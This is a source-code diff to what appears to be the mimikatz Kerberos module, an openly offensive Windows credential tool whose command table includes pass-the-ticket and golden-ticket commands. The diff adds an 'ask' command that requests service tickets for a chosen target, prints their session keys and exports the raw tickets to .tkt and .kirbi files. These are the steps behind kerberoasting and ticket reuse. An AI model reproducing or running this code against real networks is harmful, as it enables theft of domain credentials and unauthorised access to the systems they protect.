@@ -13,6 +13,7 @@ HANDLE	g_hLSA = NULL;
 const KUHL_M_C kuhl_m_c_kerberos[] = {
 	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
 	{kuhl_m_kerberos_list,		L"list",		L"List ticket(s)"},
+	{kuhl_m_kerberos_ask,		L"ask",			L"Ask or get TGS tickets"},
 	{kuhl_m_kerberos_tgt,		L"tgt",			L"Retrieve current TGT"},
 	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
 	{kuhl_m_kerberos_golden,	L"golden",		L"Willy Wonka factory"},
@@ -273,6 +274,7 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 								{
 									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
 										kprintf(L"\n   * Saved to file     : %s", filename);
+									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 									LocalFree(filename);
 								}
 								LsaFreeReturnBuffer(pKerbRetrieveResponse);
@@ -295,6 +297,109 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
+{
+	NTSTATUS status, packageStatus;
+	PWCHAR filename = NULL, ticketname = NULL;
+	PCWCHAR szTarget;
+	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
+	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
+	KIWI_KERBEROS_TICKET ticket = {0};
+	DWORD szData;
+	USHORT dwTarget;
+	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), isTkt = kull_m_string_args_byName(argc, argv, L"tkt", NULL, NULL), isNoCache = kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL);
+
+	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
+	{
+		dwTarget = (USHORT) ((wcslen(szTarget) + 1) * sizeof(wchar_t));
+
+		szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
+		if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
+		{
+			pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
+			pKerbRetrieveRequest->CacheOptions = isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
+			pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
+			pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
+			pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
+			RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);
+			kprintf(L"Asking for: %wZ\n", &pKerbRetrieveRequest->TargetName);
+
+			status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
+			if(NT_SUCCESS(status))
+			{
+				if(NT_SUCCESS(packageStatus))
+				{
+					ticket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
+					ticket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
+					ticket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
+					ticket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
+					ticket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
+					ticket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
+
+					ticket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
+					ticket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
+					ticket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;
+
+					ticket.KeyType = ticket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
+					ticket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
+					ticket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
+
+					ticket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
+					ticket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
+					ticket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
+
+					kprintf(L"   * Ticket Encryption Type & kvno not representative at screen\n");
+					if(isNoCache && isExport)
+					kprintf(L"   * NoCache: exported ticket may vary with informations at screen\n");
+					kuhl_m_kerberos_ticket_display(&ticket, TRUE, FALSE);
+					kprintf(L"\n");
+
+					if(isTkt)
+						if(ticketname = kuhl_m_kerberos_generateFileName_short(&ticket, L"tkt"))
+						{
+							if(kull_m_file_writeData(ticketname, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
+								kprintf(L"\n   * TKT to file       : %s", ticketname);
+							else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+							LocalFree(ticketname);
+						}
+					if(isExport)
+						filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);
+
+					LsaFreeReturnBuffer(pKerbRetrieveResponse);
+
+					if(isExport)
+					{
+						pKerbRetrieveRequest->CacheOptions |= KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+						status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
+						if(NT_SUCCESS(status))
+						{
+							if(NT_SUCCESS(packageStatus))
+							{
+								if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
+										kprintf(L"\n   * KiRBi to file     : %s", filename);
+								else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+								LsaFreeReturnBuffer(pKerbRetrieveResponse);
+							}
+							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
+						}
+						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
+					}
+					if(filename)
+						LocalFree(filename);
+				}
+				else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
+					PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
+				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
+			}
+			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
+
+			LocalFree(pKerbRetrieveRequest);
+		}
+	}
+	else PRINT_ERROR(L"At least /target argument is required (eg: /target:cifs/server.lab.local)\n");
+	return STATUS_SUCCESS;
+}
+
 wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext)
 {
 	wchar_t * buffer;
@@ -303,6 +408,27 @@ wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE
 	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
 	{
 		if(swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
+			kull_m_file_cleanFilename(buffer);
+		else
+			buffer = (wchar_t *) LocalFree(buffer);
+	}
+	return buffer;
+}
+
+wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext)
+{
+	wchar_t * buffer;
+	size_t charCount = 0x1000;
+	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);
+
+	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
+	{
+		if(isLong)
+			isLong = swprintf_s(buffer, charCount, L"%08x-%wZ@%wZ-%wZ.%s", ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
+		else
+			isLong = swprintf_s(buffer, charCount, L"%08x-noname.%s", ticket->TicketFlags, ext) > 0;
+		
+		if(isLong)
 			kull_m_file_cleanFilename(buffer);
 		else
 			buffer = (wchar_t *) LocalFree(buffer);
